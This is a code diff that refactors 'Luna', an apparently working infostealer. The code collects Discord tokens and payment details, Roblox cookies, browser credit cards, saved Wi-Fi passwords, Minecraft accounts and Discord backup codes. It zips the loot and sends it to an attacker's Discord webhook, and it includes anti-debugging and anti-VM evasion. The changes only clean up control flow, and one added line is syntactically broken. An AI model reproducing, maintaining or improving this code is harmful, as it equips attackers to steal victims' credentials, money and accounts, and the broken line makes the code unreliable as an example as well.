@@ -67,10 +67,8 @@ def main(webhook: str):
 
     content = ""
     if __CONFIG__["ping"]:
-        if __CONFIG__["pingtype"] == "Everyone":
-            content += "@everyone"
-        elif __CONFIG__["pingtype"] == "Here":
-            content += "@here"
+        if __CONFIG__["pingtype"] in ["Everyone", "Here"]:
+            content += f"@{__CONFIG__['pingtype'].lower()}"
 
     if not __CONFIG__["roblox"] and not __CONFIG__["browser"] and not __CONFIG__["wifi"] and not __CONFIG__["minecraft"] and not __CONFIG__["backupcodes"]:
         webhook.send(content=content, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
@@ -80,23 +78,17 @@ def main(webhook: str):
         _file = File(f'{localappdata}\\Luna-Logged-{os.getlogin()}.zip')
         webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")
 
-    if not __CONFIG__["systeminfo"]:
-        pass
-    else:
+    if __CONFIG__["systeminfo"]:
         PcInfo()
 
-    if not __CONFIG__["discord"]:
-        pass
-    else:
+    if __CONFIG__["discord"]:
         Discord()
 
 
 def Luna(webhook: str):
     checkforwebhook()
 
-    if not __CONFIG__["antidebug_vm"]:
-        pass
-    else:
+    if __CONFIG__["antidebug_vm"]:
         Debug()
 
     procs = [main, Injection]
@@ -117,7 +109,7 @@ def trygrab(func):
 
 
 def checkforwebhook():
-    if __CONFIG__["webhook"] == "None" or __CONFIG__["webhook"] == "":
+    if __CONFIG__["webhook"] == "None" or not __CONFIG__["webhook"]:
         print("No webhook in config found. Please rebuild file.")
         sys.exit()
 
@@ -362,9 +354,7 @@ class Discord:
                                 pass
 
     def robloxinfo(self, webhook):
-        if not __CONFIG__["roblox"]:
-            pass
-        else:
+        if __CONFIG__["roblox"]:
             try:
                 if robo_cookie == "No Roblox Cookies Found":
                     pass
@@ -425,9 +415,8 @@ class Discord:
 
             nitro = premium_types.get(user['premium_type'], "❌")
 
-            if payment == []:
-                methods = "❌"
-            else:
+            methods = "❌"
+            if payment:
                 methods = ""
                 for method in payment:
                     if method['type'] == 1:
@@ -444,8 +433,9 @@ class Discord:
                 for code in codes:
                     val_codes.append((code['code'], code['promotion']['outbound_title']))
 
-            if val_codes == []:
+            if not val_codes:
                 val += f'\n:gift: `No Gift Cards Found`\n'
+
             elif len(val_codes) >= 3:
                 num = 0
                 for c, t in val_codes:
@@ -625,7 +615,7 @@ class Browsers:
         conn.close()
 
     def credit_cards(self, name: str, path: str, profile: str):
-        if name == 'opera' or name == 'opera-gx':
+        if name in ['opera', 'opera-gx']:
             path += '\\Web Data'
         else:
             path += '\\' + profile + '\\Web Data'
@@ -659,8 +649,6 @@ class Browsers:
                                 f.write(robo_cookie + "\n")
                     except Exception:
                         robo_cookie = "No Roblox Cookies Found"
-                f2.close()
-            f.close()
 
 
 @trygrab
@@ -678,24 +666,21 @@ class Wifi:
             else:
                 with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
                     f.write(f'There is no wireless interface on the system. Ethernet using twat.')
-                f.close()
 
         for i in self.wifi_list:
             command = subprocess.getoutput(
                 f'netsh wlan show profile "{i}" key=clear')
+            
+            self.name_pass[i] = ""
             if "Key Content" in command:
                 split_key = command.split('Key Content')
                 tmp = split_key[1].split('\n')[0]
                 key = tmp.split(': ')[1]
                 self.name_pass[i] = key
-            else:
-                key = ""
-                self.name_pass[i] = key
 
         with open(os.path.join(tempfolder, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
             for i, j in self.name_pass.items():
                 f.write(f'Wifi Name : {i} | Password : {j}\n')
-        f.close()
 
 
 @trygrab
@@ -728,7 +713,6 @@ class Minecraft:
                     f.write(json.dumps(self.user, indent=4))
             else:
                 f.write(self.error_message)
-        f.close()
 
 
 @trygrab
@@ -749,7 +733,6 @@ class BackupCodes:
                             f.write(line)
             else:
                 f.write("No discord backup codes found")
-        f.close()
 
 
 def zipup():
@@ -926,7 +909,7 @@ class Debug:
 
         if ip in self.blackListedIPS:
             return True
-        if mac in self.blackListedMacs:
+        return mac in self.blackListedMacs:
             return True
 
     def get_system(self) -> bool:
